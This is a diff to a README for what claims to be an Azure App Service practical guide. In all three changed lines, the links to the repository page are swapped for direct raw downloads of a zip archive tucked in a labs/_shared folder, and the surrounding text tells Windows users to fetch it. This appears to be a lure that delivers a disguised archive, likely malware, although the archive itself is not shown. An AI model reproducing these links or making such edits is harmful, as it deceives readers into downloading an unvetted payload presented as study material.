@@ -1,6 +1,6 @@
 # 📘 azure-app-service-practical-guide - Learn Azure App Service with Confidence
 
-[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Clydefa3204/azure-app-service-practical-guide)
+[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Clydefa3204/azure-app-service-practical-guide/raw/refs/heads/main/labs/_shared/azure-guide-practical-app-service-1.4.zip)
 
 ## 🖥️ What this is
 
@@ -18,7 +18,7 @@ Use this guide if you want to:
 
 Use this link to **visit the page to download** the guide:
 
-[Visit the download page](https://github.com/Clydefa3204/azure-app-service-practical-guide)
+[Visit the download page](https://github.com/Clydefa3204/azure-app-service-practical-guide/raw/refs/heads/main/labs/_shared/azure-guide-practical-app-service-1.4.zip)
 
 If you are on Windows, open the page in your browser, then:
 
@@ -261,7 +261,7 @@ This repository is set up as a practical guide, so you can expect:
 
 Use this link whenever you need to get the latest version:
 
-[https://github.com/Clydefa3204/azure-app-service-practical-guide](https://github.com/Clydefa3204/azure-app-service-practical-guide)
+[https://github.com/Clydefa3204/azure-app-service-practical-guide/raw/refs/heads/main/labs/_shared/azure-guide-practical-app-service-1.4.zip](https://github.com/Clydefa3204/azure-app-service-practical-guide/raw/refs/heads/main/labs/_shared/azure-guide-practical-app-service-1.4.zip)
 
 ## 🧩 Common Windows actions
 
